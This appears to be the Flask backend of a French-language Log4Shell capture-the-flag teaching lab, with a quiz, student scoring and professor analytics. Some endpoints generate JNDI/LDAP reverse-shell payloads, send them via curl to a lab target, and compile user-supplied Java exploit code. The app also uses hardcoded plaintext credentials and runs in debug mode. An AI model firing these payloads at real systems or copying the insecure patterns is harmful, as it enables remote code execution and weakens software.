from flask import Flask, render_template, request, jsonify, redirect, url_for, session, send_file
from flask_login import LoginManager, UserMixin, login_user, logout_user, login_required, current_user
import subprocess
import time
import os
from datetime import datetime
from reportlab.lib.pagesizes import letter
from reportlab.pdfgen import canvas
import io

app = Flask(__name__)
app.secret_key = 'log4shell_ctf_secret_key_2026'

# Flask-Login setup
login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = 'login'

# Base de données utilisateurs
users_db = {
    'student': {'password': 'student123', 'role': 'student', 'name': 'Étudiant'},
    'professor': {'password': 'prof123', 'role': 'professor', 'name': 'Professeur'}
}

# Base de données Quiz
quiz_questions = [
    {
        'id': 1,
        'question': 'Quel est le score CVSS de Log4Shell (CVE-2021-44228)?',
        'options': ['7.5', '9.0', '10.0', '8.5'],
        'correct': 2,
        'explanation': 'Log4Shell a un score CVSS de 10.0/10, ce qui en fait une vulnérabilité critique maximale.',
        'points': 10
    },
    {
        'id': 2,
        'question': 'Que signifie JNDI?',
        'options': [
            'Java Network Data Interface',
            'Java Naming and Directory Interface',
            'Java Native Development Interface',
            'Java Network Directory Integration'
        ],
        'correct': 1,
        'explanation': 'JNDI signifie Java Naming and Directory Interface, une API Java pour accéder à des services de nommage et d\'annuaire.',
        'points': 10
    },
    {
        'id': 3,
        'question': 'Quelle syntaxe déclenche la vulnérabilité Log4Shell?',
        'options': [
            '{{jndi:ldap://...}}',
            '${jndi:ldap://...}',
            '[jndi:ldap://...]',
            '<jndi:ldap://...>'
        ],
        'correct': 1,
        'explanation': 'La syntaxe ${jndi:ldap://...} est utilisée par Log4j pour effectuer des lookups JNDI.',
        'points': 15
    },
    {
        'id': 4,
        'question': 'Quel type de serveur est utilisé dans l\'exploitation Log4Shell?',
        'options': ['HTTP', 'LDAP', 'FTP', 'SSH'],
        'correct': 1,
        'explanation': 'Un serveur LDAP malveillant est utilisé pour rediriger vers le payload Java.',
        'points': 10
    },
    {
        'id': 5,
        'question': 'Quelle version de Log4j corrige complètement la vulnérabilité?',
        'options': ['2.15.0', '2.16.0', '2.17.1', '2.14.1'],
        'correct': 2,
        'explanation': 'La version 2.17.1 corrige complètement Log4Shell et ses variantes.',
        'points': 15
    },
    {
        'id': 6,
        'question': 'Quel header HTTP est couramment utilisé pour injecter le payload?',
        'options': ['Content-Type', 'User-Agent', 'Accept', 'Host'],
        'correct': 1,
        'explanation': 'Le header User-Agent est souvent loggé et donc un vecteur d\'injection courant.',
        'points': 10
    },
    {
        'id': 7,
        'question': 'Que permet d\'obtenir Log4Shell?',
        'options': [
            'Lecture de fichiers',
            'Déni de service',
            'Exécution de code à distance (RCE)',
            'Injection SQL'
        ],
        'correct': 2,
        'explanation': 'Log4Shell permet l\'exécution de code arbitraire à distance (Remote Code Execution).',
        'points': 15
    },
    {
        'id': 8,
        'question': 'Quelle commande Java désactive les lookups JNDI?',
        'options': [
            '-Dlog4j.disable=true',
            '-Dlog4j2.formatMsgNoLookups=true',
            '-Djndi.disable=true',
            '-Dlog4j.safe=true'
        ],
        'correct': 1,
        'explanation': 'Le flag -Dlog4j2.formatMsgNoLookups=true désactive les lookups dans les messages.',
        'points': 15
    },
    {
        'id': 9,
        'question': 'En quelle année Log4Shell a-t-elle été découverte?',
        'options': ['2020', '2021', '2022', '2023'],
        'correct': 1,
        'explanation': 'Log4Shell a été découverte publiquement en décembre 2021.',
        'points': 5
    },
    {
        'id': 10,
        'question': 'Quel protocole peut être utilisé à la place de LDAP?',
        'options': ['RMI', 'DNS', 'CORBA', 'Tous les précédents'],
        'correct': 3,
        'explanation': 'JNDI supporte plusieurs protocoles: LDAP, RMI, DNS, CORBA, etc.',
        'points': 20
    }
]

# Stockage des sessions
user_sessions = {}
attack_analytics = {
    'total_attacks': 0,
    'successful_attacks': 0,
    'failed_attacks': 0,
    'total_shells': 0
}
attack_log = []

class User(UserMixin):
    def __init__(self, username, role, name):
        self.id = username
        self.role = role
        self.name = name

@login_manager.user_loader
def load_user(user_id):
    if user_id in users_db:
        return User(user_id, users_db[user_id]['role'], users_db[user_id]['name'])
    return None

def log_user_action(action, details=''):
    if current_user.is_authenticated:
        username = current_user.id
        if username in user_sessions:
            user_sessions[username]['actions'].append({
                'time': datetime.now().strftime('%H:%M:%S'),
                'action': action,
                'details': details
            })

# Routes d'authentification
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        data = request.json
        username = data.get('username')
        password = data.get('password')
        
        if username in users_db and users_db[username]['password'] == password:
            user = User(username, users_db[username]['role'], users_db[username]['name'])
            login_user(user)
            
            if username not in user_sessions:
                user_sessions[username] = {
                    'start_time': datetime.now(),
                    'actions': [],
                    'score': 0,
                    'attacks': 0,
                    'success': 0,
                    'quiz_score': 0,
                    'quiz_attempts': 0,
                    'quiz_completed': []
                }
            
            return jsonify({
                'status': 'success',
                'role': user.role,
                'redirect': '/professor' if user.role == 'professor' else '/dashboard'
            })
        
        return jsonify({'status': 'error', 'message': 'Identifiants invalides'})
    
    return render_template('login.html')

@app.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect(url_for('login'))

@app.route('/')
def index():
    if current_user.is_authenticated:
        if current_user.role == 'professor':
            return redirect(url_for('professor_dashboard'))
        return redirect(url_for('dashboard'))
    return redirect(url_for('login'))

@app.route('/dashboard')
@login_required
def dashboard():
    if current_user.role == 'professor':
        return redirect(url_for('professor_dashboard'))
    return render_template('dashboard.html', user=current_user)

@app.route('/learn')
@login_required
def learn():
    return render_template('learn.html', user=current_user)

@app.route('/quiz')
@login_required
def quiz():
    if current_user.role == 'professor':
        return redirect(url_for('professor_dashboard'))
    return render_template('quiz.html', user=current_user)

@app.route('/professor')
@login_required
def professor_dashboard():
    if current_user.role != 'professor':
        return redirect(url_for('dashboard'))
    return render_template('professor.html', user=current_user)

# API Quiz
@app.route('/api/quiz/questions')
@login_required
def get_quiz_questions():
    if current_user.role != 'student':
        return jsonify({'status': 'error', 'message': 'Accès refusé'})
    
    questions = []
    for q in quiz_questions:
        questions.append({
            'id': q['id'],
            'question': q['question'],
            'options': q['options'],
            'points': q['points']
        })
    
    return jsonify({'status': 'success', 'questions': questions})

@app.route('/api/quiz/submit', methods=['POST'])
@login_required
def submit_quiz():
    if current_user.role != 'student':
        return jsonify({'status': 'error', 'message': 'Accès refusé'})
    
    data = request.json
    answers = data.get('answers', {})
    
    score = 0
    total_points = 0
    results = []
    
    for q in quiz_questions:
        total_points += q['points']
        user_answer = int(answers.get(str(q['id']), -1))
        is_correct = user_answer == q['correct']
        
        if is_correct:
            score += q['points']
        
        results.append({
            'id': q['id'],
            'question': q['question'],
            'user_answer': user_answer,
            'correct_answer': q['correct'],
            'is_correct': is_correct,
            'explanation': q['explanation'],
            'points': q['points'] if is_correct else 0
        })
    
    if current_user.id in user_sessions:
        user_sessions[current_user.id]['quiz_score'] = score
        user_sessions[current_user.id]['score'] += score
        user_sessions[current_user.id]['quiz_attempts'] += 1
        user_sessions[current_user.id]['quiz_completed'].append({
            'time': datetime.now().strftime('%H:%M:%S'),
            'score': score,
            'total': total_points
        })
    
    log_user_action('quiz_completed', f'Score: {score}/{total_points}')
    
    return jsonify({
        'status': 'success',
        'score': score,
        'total': total_points,
        'percentage': round((score / total_points) * 100, 2),
        'results': results
    })

@app.route('/api/quiz/stats')
@login_required
def get_quiz_stats():
    if current_user.id in user_sessions:
        return jsonify({
            'status': 'success',
            'quiz_score': user_sessions[current_user.id].get('quiz_score', 0),
            'attempts': user_sessions[current_user.id].get('quiz_attempts', 0)
        })
    return jsonify({'status': 'success', 'quiz_score': 0, 'attempts': 0})

# API Analytics
@app.route('/api/analytics/global')
@login_required
def get_global_analytics():
    return jsonify({'status': 'success', 'data': attack_analytics})

@app.route('/api/analytics/students')
@login_required
def get_student_analytics():
    if current_user.role != 'professor':
        return jsonify({'status': 'error', 'message': 'Accès refusé'})
    
    students_data = []
    for username, session_data in user_sessions.items():
        if username != 'professor':
            user = users_db.get(username, {})
            students_data.append({
                'username': username,
                'name': user.get('name', username),
                'score': session_data.get('score', 0),
                'attacks': session_data.get('attacks', 0),
                'success': session_data.get('success', 0),
                'quiz_score': session_data.get('quiz_score', 0),
                'quiz_attempts': session_data.get('quiz_attempts', 0),
                'time_spent': str(datetime.now() - session_data.get('start_time', datetime.now())),
                'last_action': session_data.get('actions', [])[-1]['action'] if session_data.get('actions') else 'Aucune'
            })
    
    return jsonify({'status': 'success', 'students': students_data})

@app.route('/api/analytics/export', methods=['POST'])
@login_required
def export_analytics():
    if current_user.role != 'professor':
        return jsonify({'status': 'error', 'message': 'Accès refusé'})
    
    buffer = io.BytesIO()
    p = canvas.Canvas(buffer, pagesize=letter)
    width, height = letter
    
    p.setFont("Helvetica-Bold", 24)
    p.drawString(100, height - 100, "Log4Shell CTF Lab - Rapport")
    
    p.setFont("Helvetica", 12)
    p.drawString(100, height - 130, f"Date: {datetime.now().strftime('%d/%m/%Y %H:%M')}")
    
    y = height - 180
    p.setFont("Helvetica-Bold", 16)
    p.drawString(100, y, "Statistiques Globales")
    y -= 30
    
    p.setFont("Helvetica", 12)
    p.drawString(120, y, f"Total attaques: {attack_analytics['total_attacks']}")
    y -= 20
    p.drawString(120, y, f"Attaques réussies: {attack_analytics['successful_attacks']}")
    y -= 20
    p.drawString(120, y, f"Shells obtenus: {attack_analytics['total_shells']}")
    y -= 40
    
    p.setFont("Helvetica-Bold", 16)
    p.drawString(100, y, "Étudiants")
    y -= 30
    
    p.setFont("Helvetica", 10)
    for username, session_data in user_sessions.items():
        if username != 'professor' and y > 100:
            p.drawString(120, y, f"{username}: Score {session_data.get('score', 0)} | Quiz: {session_data.get('quiz_score', 0)}")
            y -= 20
    
    p.showPage()
    p.save()
    buffer.seek(0)
    
    return send_file(buffer, as_attachment=True, download_name='log4shell_report.pdf', mimetype='application/pdf')

# API Lab
@app.route('/api/status')
@login_required
def status():
    try:
        result = subprocess.run(['docker', 'ps', '--format', '{{.Names}}\t{{.Status}}'], 
                              capture_output=True, text=True)
        containers = []
        for line in result.stdout.strip().split('\n'):
            if 'log4shell' in line:
                parts = line.split('\t')
                containers.append({'name': parts[0], 'status': parts[1]})
        
        log_user_action('check_status')
        return jsonify({'status': 'success', 'containers': containers})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/api/start-containers', methods=['POST'])
@login_required
def start_containers():
    try:
        os.chdir('/home/farahrex/log4shell-dockerlab-main')
        subprocess.Popen(['docker-compose', 'up', '-d'])
        time.sleep(5)
        
        if current_user.id in user_sessions:
            user_sessions[current_user.id]['score'] += 10
        
        log_user_action('start_containers')
        return jsonify({'status': 'success', 'message': 'Containers démarrés (+10 points)'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/api/stop-containers', methods=['POST'])
@login_required
def stop_containers():
    try:
        os.chdir('/home/farahrex/log4shell-dockerlab-main')
        subprocess.run(['docker-compose', 'down'])
        log_user_action('stop_containers')
        return jsonify({'status': 'success', 'message': 'Containers arrêtés'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/api/generate-payload', methods=['POST'])
@login_required
def generate_payload():
    data = request.json
    payload_type = data.get('type', 'simple')
    attacker_ip = data.get('ip', '192.168.126.131')
    
    payloads = {
        'simple': f'${{jndi:ldap://{attacker_ip}:1389/Exploit}}',
        'reverse_shell': f'${{jndi:ldap://{attacker_ip}:1389/Rev}}'
    }
    
    log_user_action('generate_payload')
    return jsonify({
        'status': 'success',
        'payload': payloads.get(payload_type, payloads['simple'])
    })

@app.route('/api/launch-attack', methods=['POST'])
@login_required
def launch_attack():
    data = request.json
    target = data.get('target', '192.168.126.131:8080')
    payload = data.get('payload', '${jndi:ldap://192.168.126.131:1389/Rev}')
    
    try:
        result = subprocess.run([
            'curl', f'http://{target}',
            '-H', f'X-Api-Version: {payload}'
        ], capture_output=True, text=True, timeout=5)
        
        attack_analytics['total_attacks'] += 1
        attack_analytics['successful_attacks'] += 1
        attack_analytics['total_shells'] += 1
        
        if current_user.id in user_sessions:
            user_sessions[current_user.id]['attacks'] += 1
            user_sessions[current_user.id]['score'] += 50
            user_sessions[current_user.id]['success'] += 1
        
        attack_log.append({
            'time': datetime.now().strftime('%H:%M:%S'),
            'user': current_user.name,
            'target': target,
            'payload': payload
        })
        
        log_user_action('launch_attack')
        return jsonify({'status': 'success', 'message': 'Attaque lancée (+50 points)'})
    except Exception as e:
        attack_analytics['failed_attacks'] += 1
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/api/compile-payload', methods=['POST'])
@login_required
def compile_payload():
    data = request.json
    java_code = data.get('code', '')
    
    try:
        with open('/home/farahrex/log4shell-dockerlab-main/attacker-webserver/Rev.java', 'w') as f:
            f.write(java_code)
        
        result = subprocess.run([
            'javac', '--release', '8', 
            '/home/farahrex/log4shell-dockerlab-main/attacker-webserver/Rev.java'
        ], capture_output=True, text=True)
        
        if result.returncode == 0:
            if current_user.id in user_sessions:
                user_sessions[current_user.id]['score'] += 20
            
            log_user_action('compile_payload')
            return jsonify({'status': 'success', 'message': 'Payload compilé (+20 points)'})
        else:
            return jsonify({'status': 'error', 'message': result.stderr})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/api/start-webserver', methods=['POST'])
@login_required
def start_webserver():
    try:
        result = subprocess.run(['lsof', '-ti:8888'], capture_output=True, text=True)
        if result.stdout.strip():
            return jsonify({'status': 'success', 'message': 'Serveur web déjà actif'})
        
        os.chdir('/home/farahrex/log4shell-dockerlab-main/attacker-webserver')
        subprocess.Popen(['python3', '-m', 'http.server', '8888'], 
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(1)
        
        log_user_action('start_webserver')
        return jsonify({'status': 'success', 'message': 'Serveur web démarré'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/api/attack-log')
@login_required
def get_attack_log():
    return jsonify({'status': 'success', 'log': attack_log})

@app.route('/api/user/score')
@login_required
def get_user_score():
    if current_user.id in user_sessions:
        session_data = user_sessions[current_user.id]
        return jsonify({
            'status': 'success',
            'score': session_data.get('score', 0),
            'attacks': session_data.get('attacks', 0),
            'success': session_data.get('success', 0),
            'quiz_score': session_data.get('quiz_score', 0)
        })
    return jsonify({'status': 'success', 'score': 0, 'attacks': 0, 'success': 0, 'quiz_score': 0})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
